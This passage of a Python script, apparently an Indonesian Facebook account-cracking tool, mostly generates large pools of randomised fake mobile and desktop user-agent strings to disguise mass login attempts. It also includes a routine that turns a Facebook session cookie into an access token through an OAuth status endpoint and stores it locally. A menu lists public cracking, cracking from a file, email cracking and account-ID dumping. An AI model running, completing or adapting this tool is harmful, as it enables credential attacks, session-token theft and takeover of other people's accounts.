	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)#ffffff
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; U; Android;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; Redmi 5 Plus Build/OPM1.171019.019'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='UCBrowser/13.4.0.1306 Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi Note 9 Pro)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['V2111 Build/SP1A.210812.003; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['JNY-LX2 Build/HUAWEIJNY-L22; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['HLK-AL00 Build/HONORHLK-AL00; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['ASUS_Z01QD)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 4A Build/MMB29M; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Lenovo TB-X606X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 OPR/68.3.3557.64528'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPH2349) AppleWebKit/537.36'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='(KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X682C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 3)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
for z in range(10000):
    andro_version = random.choice([
        "4.4", "5.0", "5.1", "6.0", "7.0", "7.1", "8.0", "8.1", "9", "10", "11", "12", "13"
    ])
    andro_build = random.choice([
        "SM-G991B", "Pixel 6 Pro", "OnePlus 9", "Xiaomi 12", "Redmi Note 10",
        "Galaxy A52", "Moto G Power (2022)", "Nokia X20", "Sony Xperia 1 III",
        "Huawei P40 Pro", "SM-A515F", "SM-G973F", "Pixel 4 XL", "RMX3370",
        "V2127", "CPH2305", "KFONWI", "ONEPLUS A6000", "MI 8 Lite"
    ])
    android_fingerprint = random.choice([
        "google/redfin/redfin:11/RQ1A.210105.003/7087148:user/release-keys",
        "google/raven/raven:12/SP1A.210812.016/7650812:user/release-keys",
        "samsung/r0qxx/r0q:11/RP1A.200720.012/G991BXXU2AUG4:user/release-keys",
        "OnePlus/instantnoodlep/instantnoodle:12/RKQ1.211103.002/08241715:user/release-keys",
        "google/oriole/oriole:13/TP1A.220624.021/8725868:user/release-keys"
    ])
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 9)}.{random.randint(0, 9)}.{random.randint(1, 99)}.{random.randint(10, 999)}"
    fbbv = str(random.randint(10000000, 99999999))
    fbrv = str(random.randint(100000000, 999999999))
    density = f"{random.randint(1, 4)}.{random.randint(0, 9)}"
    width = str(random.randint(300, 1080))
    height = str(random.randint(600, 2400))
    os_version = f"{random.randint(8, 16)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    user_agent = (
        f"Mozilla/5.0 (Linux; Android {andro_version}; {andro_build} Build/{android_fingerprint}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,115)}.0.{random.randint(0,9999)}.{random.randint(0,999)} "
        f"Mobile Safari/537.36 YandexBrowser/{random.randint(20,24)}.0.{random.randint(0,9999)}.0"
    )
    ugen.append(user_agent)

for _ in range(10000):  # Menggunakan `_` karena variabel tidak digunakan
    rr = random.randint
    rc = random.choice
    merek = rc([
        'SM-A405FN', 'SM-A346M', 'SM-J415FN', 'SM-X706B', 'SM-J337R4', 'SM-A9000', 
        'SM-G532G', 'SM-J810M', 'SM-T280',  # Merek lama
        'Ando A100', 'Ando S200', 'Ando X300',  # Merek Ando
        'Infinix X6811', 'Infinix X6823', 'Infinix X663D',  # Merek Infinix
        'Xiaomi 2201116SG', 'Xiaomi 2109119DG', 'Redmi Note 12',  # Merek terbaru
        'Realme RMX3195', 'Realme RMX3686', 'Vivo V2168A', 'Vivo Y21s'
    ])
    
    build = rc([
        f"RPA.{rr(100000,999999)}", f"RQ3A.{rr(100000,999999)}", f"RP1A.{rr(100000,999999)}",
        f"QKQ1.{rr(100000,999999)}", f"SP1A.{rr(100000,999999)}", f"TP1A.{rr(100000,999999)}"
    ])
    u1 = f"Mozilla/5.0 (Linux; Android {rr(4,12)}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{rr(0,4)} Chrome/{rr(73,150)}.0.{rr(5500,5900)}.{rr(75,150)} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {rr(4,12)}; {merek} Build/{build}.{rr(111111,210000)}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{rr(73,150)}.0.{rr(5500,5900)}.{rr(75,150)} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {rr(4,12)}.{rr(1,9)}.{rr(1,9)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{rr(73,150)}.0.{rr(5500,5900)}.{rr(75,150)} Mobile/14G60 Safari/604.1"
    heeeee = rc([u1, u2, u3])
    ugen.append(heeeee)
for apa in range(10000):
	versi_android = random.randint(4,13)
	versi_chrome = str(random.randint(300,325))+".35.0.17.116."+str(random.randint(1,8))+"."+str(random.randint(50,250))
	versi_app = random.randint(510000000,699999999)
	ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/{versi_chrome};FBPN/com.facebook.katana;FBLC/th_TH;FBBV/{versi_app};FBCR/Axis-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/{str(random.randint(4,10))};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1"
	ugen.append(ugent)
	
for apa in range(10000):
	versi_android = random.randint(4,12)
	versi_android_2 = random.randint(6,21)
	versi_android_3 = random.randint(2,10)
	versi_chrome = str(random.randint(119,325))+"."+str(random.randint(49,398))+"."+str(random.randint(50,250))+"."+str(random.randint(20,450))
	ugent = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {versi_android}_{versi_android_2}_{versi_android_3}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Safari/537.36"
	ugen.append(ugent)
 
for xz in range(10000):
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; Android 8.1.0; Gravity_5_GO Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.143 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/448.0.0.30.115;]"
    uazku2 = f"Mozilla/5.0 (Linux; Android 10; vivo 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36"
    uazku3 = f"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 1520) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537 UCBrowser/4.2.1.541 Mobile"
    uazku4 = f"Mozilla/5.0 (Linux; Android 12; MP08 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]"
    uazku5 = f"Mozilla/5.0 (Linux; Android 13; TECNO Mobile KI8 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.175 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/451.0.0.45.109;]"
    uazstart = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5]))
    ugen.append(uazstart)
#----------[ USER-CRACK ]----------#  

def Login_lagi():
    try:
        os.system('clear')
        ses = requests.Session()
        prints(Panel.fit("Jika Ingin Crack Tanpa Cookie bisa ketik 'Email'. Jangan Typo!"))
        cookie = input('\n╰─ Masukan Cookie : ')
        if cookie in ['Email']:
            Email()
        else:pass
        open('.cookie.txt','w').write(cookie)
        with requests.Session() as rsn:
            try:
                rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
                
                response = rsn.get(
                    'https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', 
                    cookies={'cookie': cookie}
                )
                
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    with open(".token.txt", "w") as file:
                        file.write(token)
                    print('Login Berhasil')
                else:
                    print('Login gagal')
            except:
                print('Gagal mendapatkan token')
            
            print('Berhasil! Jalankan lagi perintahnya.')
            time.sleep(1)
            menu()

    except Exception as e:
        os.system("rm -f .tok.txt")
        os.system("rm -f .cok.txt")
        print(f'Login gagal: {e}')
        exit()
	
def logo():
    prints(Panel.fit('  _________   _____ __________.____   __________ \n /   _____/  /     \\______   \    |  \______   \ \n \_____  \  /  \ /  \|     ___/    |   |    |  _/ \n /        \/    Y    \    |   |    |___|    |   \ \n/_______  /\____|__  /____|   |_______ \______  / \n        \/         \/                 \/      \/ ',style="bold blue"))

###----------[ BAGIAN MENU ]----------###
def menu():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cookie.txt', 'r').read()
    except IOError:
        print('cookies mu terkena cp')
        time.sleep(5)
        Login_lagi()
    os.system('clear')
    logo()
    prints(Panel(f"[bold white]1. Crack Publik \t\t2. Dump [ api/graphql ]\n3. Crack from file\t\t4. Ua generator\n0. Logout\t\t\t5. Crack Email ",style='bold blue'))
    alya_ayang_kakang_X_yaya_and_cikawan = input(f'Pilih: ')
    if alya_ayang_kakang_X_yaya_and_cikawan in ['1']:
        dump()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['2']:
        TimelineNoLogin()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['3']:
        crack_file()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['4']:
        ua = get_random_user_agent()
        ua2 = sistem_dalvik_ua()
        prints(Panel.fit(f'[#00C8FF]' + ua))
        prints(Panel.fit(f'[#00C8FF]' + ua2))
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['5']:
        Email()
    elif alya_ayang_kakang_X_yaya_and_cikawan in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print(f'Success logout')
        exit()
    else:
        exit()
        
def get_random_user_agent():
	user_agent_components = {
	'browser': ['Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android',],
	'build': ['Build/MMB29M; wv)','Build/TP1A.220624.014; wv)','Build/PPR1.180610.011; wv)','Build/TP1A.220624.014; wv)','Build/SP1A.210812.016; wv)','Build/RP1A.200720.012; wv)','Build/LMY48B; wv)','Build/QP1A.190711.020; wv)',],
	'version': ['SM-M146B','SM-M326B','SM-N971N','SM-N971U','SM-N986N','SM-N9860','SM-N986W','SM-N986U1','SM-N986U', 'SM-N986B','SM-M625F','SM-N7506V','SM-N7500Q', 'SM-N750L', 'SM-N7507', 'SM-N750S', 'SM-N750K', 'SM-N7505', 'SM-N750', 'SM-N7502', 'SM-N910C', 'SM-N910S', 'SM-N910H', 'SM-N910F', 'SM-N910G', 'SM-N910U', 'SM-N910K', 'SM-N916S', 'SM-N910L', 'SM-N916L', 'SM-N916K', 'SM-N910T3', 'SM-M3070', 'SM-M307FN', 'SM-M307F', 'SM-N9150', 'SM-N915A', 'SM-N915D', 'SM-N915D', 'SM-N915F', 'SM-N915FY', 'SM-N915G', 'SM-N915K', 'SM-N915S', 'SM-N915X', 'SM-M205M', 'SC-02K', 'SM-G960U', 'SM-N920CD', 'SHV-E250L', 'SM-N9208', 'GT-N7100', 'SM-G110B', 'SM-N915L', 'SM-N915T', 'SC-01G', 'SM-M205F', 'SM-G960X', 'SM-G960', 'SM-N920C', 'SGH-I317M', 'SM-N920', 'GT-N7105', 'SM-G730A', 'SM-N915P', 'SM-N915V', 'SM-M205G', 'SM-G960N', 'SM-G960U1', 'SM-G960W', 'SM-M135F', 'SGH-T889', 'SHV-E250S', 'SM-G110M', 'GT-I8190L', 'SM-N915R4,', 'SM-N915W8', 'SM-M205FN', 'SCV38', 'SM-G9600', 'SM-G960F', 'SM-M127F', 'SHV-E250K', 'SM-G110H', 'SM-G110B', 'GT-I8190N', 'SM-S918U', 'SM-S918U1', 'SM-S918W', 'SM-S918N', 'SM-S9180', 'SM-S918E', 'SM-G990F', 'GT-I8200', 'GT-I8200N', 'GT-I8200L', 'GT-I8190', 'SM-S918B', 'SM-G550T2', 'SM-S550TL', 'SM-G550T', 'SM-G550T1', 'SM-G5510', 'SM-G5528', 'SM-G550F', 'SM-G5500', 'SM-M136B', 'GT-I9515L', 'SM-M115M', 'SM-R855', 'SM-G860', 'SM-G860P', 'GT-I9505', 'GT-I9515', 'SGH-I337', 'SC-04E', 'SM-R845F', 'SM-R855U', 'SM-R845U', 'SM-G530FZ', 'SM-G530H', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530W', 'SM-M115F', 'GT-P6200', 'GT-S5360', 'SM-R850', 'SM-R840', '600GN', 'SM-G530Y', 'SM-G5308W', 'SM-G530AZ', 'SM-G5309W', 'SM-G530BT', 'SM-G530FZ', 'SM-G530A', 'SM-G530M', 'SM-G531BT', 'SM-G530MU', 'M2004J19C', 'M2006C3LG', 'SM-G5306W', 'SM-G531Y', 'SM-G530T1', 'SM-G531M', 'SM-G530FQ', 'SM-G530F', ],
	'os': ['AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) Chrome/','AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2. Chrome/',' AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/', ],
	'mobile': ['Mobile Safari/537.36', ], 
	'fb_waf': ['[FB_IAB/Orca-Android;FBAV/354.0.0.10.113;]','[FB_IAB/FB4A;FBAV/406.0.0.26.90;]','[FB_IAB/FB4A;FBAV/404.0.0.35.70;]','[FBAN/EMA;FBLC/en_US;FBAV/331.0.0.9.105;]','[FB_IAB/FB4A;FBAV/406.0.0.17.90;]','[FB_IAB/FB4A;FBAV/405.0.0.23.72;]','[FB_IAB/FB4A;FBAV/405.1.0.28.72;]','[FB_IAB/FB4A;FBAV/396.0.0.21.104;]','[FB_IAB/FB4A;FBAV/385.0.0.32.114;]','[FB_IAB/FB4A;FBAV/387.0.0.24.102;]'],}
	browser = random.choice(user_agent_components['browser'])
	app = random.randint(2,13)
	build = random.choice(user_agent_components['build'])
	version = random.choice(user_agent_components['version'])
	os = random.choice(user_agent_components['os'])
	language = str(random.randint(50,199)) + ".0." + str(random.randint(2999,5999)) + "." + str(random.randint(50,150))
	mobile = random.choice(user_agent_components['mobile'])
	fb = random.choice(user_agent_components['fb_waf'])
	ua_oppo = f'{browser} {app}; {version} {build} {os}{language} {mobile} {fb}'
	return ua_oppo

def sistem_dalvik_ua():
	user_componen = {
		'mes': ['MessengerLite','Orca-Android','FB4A',],
		'com' : ['com.facebook.mlite','com.facebook.orca','com.facebook.katana',],
		'loc' : ['en_US','th_TH','vi_VN','id-ID','jp-JP',],
		'fbcr' : ['Airtel','TNT','TRUE-H','AIS','null','T-Mobile',],
		'model' : ['LGE','INFINIX MOBILITY LIMITED','OPPO','samsung','oppo','vivo','infinix','redmi','realmi','lg','asus',],
		'mod' : ['lge','Infinix','OPPO','samsung','Redmi','Realmi','lg','Asus','POCO','XIOMI',],
		'jenis' : ['L-03K','Infinix X688B','CPH1909','SM-A720F','SM-G532G','SM-G3518',],
	}
